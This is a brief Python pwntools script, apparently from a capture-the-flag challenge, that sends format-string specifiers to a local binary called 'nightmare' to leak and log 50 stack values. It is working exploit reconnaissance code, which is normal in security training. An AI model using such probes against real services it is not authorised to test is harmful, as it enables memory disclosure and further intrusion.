#!/usr/bin/env python


from pwn import *

BINARY = "./nightmare"
ADDR = "localhost"
PORT = 4444

splash()
elf = context.binary = ELF(BINARY)


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    else:
        return remote(ADDR, PORT)


def leak_stack():
    stack = {}

    for i in range(1, 51):
        io = conn()
        offset = f"%{i}$p"
        io.sendlineafter("> ", "2")
        io.sendlineafter(">> ", offset)
        result = io.recvuntil("\n")[:-1]
        stack[i] = result
        io.close()

    for offset, value in stack.items():
        log.info(f"{offset}: {value}")


if __name__ == "__main__":
    leak_stack()
